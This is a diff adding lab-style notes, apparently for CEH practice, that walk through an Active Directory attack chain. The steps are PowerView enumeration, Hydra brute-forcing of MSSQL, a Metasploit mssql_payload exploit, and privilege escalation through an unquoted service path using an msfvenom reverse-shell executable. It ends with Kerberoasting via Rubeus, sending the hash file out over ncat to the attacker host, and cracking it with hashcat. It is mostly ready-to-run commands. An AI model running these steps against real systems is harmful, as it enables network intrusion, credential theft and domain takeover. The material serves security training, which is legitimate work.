@@ -982,5 +982,137 @@ found here mark is pewned
 
 * Powerview
 ```console
-~$:
+~$:open Remmina with credential opt from password spray technique 
+open powershell
+cd Downloads 
+Powershell -EP Bypass
+. .\PowerView.ps1
+Get-NetComputer (shows computer object)
+Get-NetGroup (list all the grooup)
+Get-NetUser (details of user account)
+during this enumeration
+we found new user >> SQL_srv
+```
+```console
+~$: listed commands that you can use with PowerView.ps1 for enumeration:
+
+Get-NetOU - Lists all organizational units (OUs) in the domain.
+Get-NetSession - Lists active sessions on the domain.
+Get-NetLoggedon - Lists users currently logged on to machines.
+Get-NetProcess - Lists processes running on domain machines.
+Get-NetService - Lists services on domain machines.
+Get-NetDomainTrust - Lists domain trust relationships.
+Get-ObjectACL - Retrieves ACLs for a specified object.
+Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
+Get-NetSPN - Lists service principal names (SPNs) in the domain.
+Invoke-ShareFinder - Finds shared folders in the domain.
+Invoke-UserHunter - Finds where domain admins are logged in.
+Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines.
+```
+</details>
+<details>
+<summary>Perform Attack on MSSQL service</summary>
+
+* xp_cmdshell is a SQL server stored procedure enabling command shell execution. (allows to interact with system which connected to the sql)
+```console
+~$: during nmap scan we observed that host 10.10.1.30 port 1433 is opened (sql port)
+as we got the user name through powerview.ps1 enumeration now we have to find the password so we are using
+```
+>>Hydra
+```console
+~$: store SQL_srv in text file
+pluma SQL_srv > user.txt
+hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
+>>
+Next, we will attempt to log into the service using mssqlclient.py.
+the data base name is master here
+```
+```console
+~$: and execute
+ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';,
+it returns a value one so that we know xp_cmdshell is enables
+```
+>>next open msfconsole
+```console
+~$: use exploit/windows/mssql/mssql_payload
+set RHOST 10.10.1.30
+set USERNAME SQL_srv
+set PASSWORD batman
+set DATABASE master
+
+
+>>next
+type shell (to interact with shell cmd with system)
+whoami (to confirm the username)
+```
+<summary>Perform Privilege Escalation</summary>
+
+* WinPEASx64.exe (tool for privilage escalation)
+```console
+~$: to perform a higher attack we need a higher previlage so
+we are going to run WinPEASx64.exe in victim machine
+in meterpreter
+Move to C:\ using the command cd C:\.cd \Users\Public\Downloads
+type powershell
+
+>> we need to host winPEASx64.exe 
+open new cmd as root
+and type
+ cd /root/ADtools
+ python3 -m http.server and press Enter to host the winPEASx64.exe file
+ >> again open shell terminal (parrot)
+ wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
+
+ execute
+  ./winpeas.exe.
+  >> observe the output. Here, we have a file named file.exe in C:\Program Files\CEH Services that is unquoted and can be exploited for privilege escalation. (in autorun application section)
+  ```
+  ```console
+  ~$: in new terminal (parrot)
+  msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
+  get back to shell cmd
+  cd ../../.. ; cd "Program Files/CEH Services".
+  >>
+  move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
+  ```
+  >>netcat
+  ```console
+  ~$: nc -nvlp 8888 
+  open victim machine win 2019 (ad)
+  and login with user name SQL_srv n pass batman
+  and back to nc cmd
+  here it listend and 
+  whoami
+  ```
+  </details>
+  <details>
+  <summary>Perform Kerberoasting Attack</summary>
+
+  * Rubeus (tool)
+  ```console
+~$:powershell 
+ >>in netcat cmd to get into the powershell
+ navigate to downloads
+ >>
+ Now, we will be downloading Rubeus and netcat. Execute the command wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe. Once the tools are downloaded type exit and press Enter.
+ >>
+ cd ../.. && cd Users\Public\Downloads and press Enter to move into the Downloads folder.
+ ```
+ ```console
+ ~$: execute the command
+ rubeus.exe kerberoast /outfile:hash.txt.
+
+ >> to send this hash file to attacker system we using netcat
+ open new terminal
+ nc -lvp 9999 > hash.txt 
+
+ In the shell terminal, execute the command
+  ncat.exe -w 3 10.10.1.13 9999 < hash.txt.
+  get back to netcat cmd and press enter to save the file
+  ```
+  >>offline crack of hach by using Hashcat
+  ```console
+  ~$:  hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
+  advances! is a got password
+  
 
